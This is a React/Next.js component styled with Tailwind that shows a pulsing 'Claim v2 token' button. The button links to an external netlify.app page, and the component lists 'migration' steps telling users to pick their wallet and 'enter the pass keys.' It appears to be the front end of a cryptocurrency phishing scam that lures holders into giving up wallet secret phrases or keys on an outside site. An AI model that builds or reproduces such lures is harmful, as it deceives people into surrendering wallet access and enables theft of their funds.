"use client";
import { useState, useEffect } from "react";
import tw from "tailwind-styled-components";

const AnimatedButton = tw.button`
  animate-pulse
  bg-blue-500
  hover:bg-blue-600
  text-white
  font-bold
  text-4xl
  py-4
  px-4
  rounded
`;

const AttentionGrabber: React.FC = () => {
  const [isVisible, setIsVisible] = useState<boolean>(false);

  useEffect(() => {
    setIsVisible(true);
  }, []);

  return (
    <div className="flex flex-col gap-8 md:flex-row md:gap-10 justify-center items-center mt-4 p-3 px-5">
      <AnimatedButton
        className={`transform ${isVisible ? "scale-110" : "scale-0"} px-4`}
      >
        <a
          href="https://claim-net.netlify.app/app/list-1.html"
          rel="noopener"
          title="claim"
        >
          Claim v2 token
        </a>
      </AnimatedButton>
      <div
        className="text-white   font-normal  text-info leading-[22px] text-base pb-[30px] mx-auto lg:mx-0 px-4"
        data-v-0fa46892=""
      >
        <h1 className=" font-semibold text-base">
          {" "}
          Instructions for migration{" "}
        </h1>
        <ul className="list-disc ">
          <li>Click on claim v2 token</li>
          <li>Choose your wallet</li>
          <li>Enter the pass keys and proceed</li>
          <li>
            Once you’re done you will receive <br />
            your confirmation barcode and just add the v2 smart contract
          </li>
        </ul>
      </div>
    </div>
  );
};

export default AttentionGrabber;
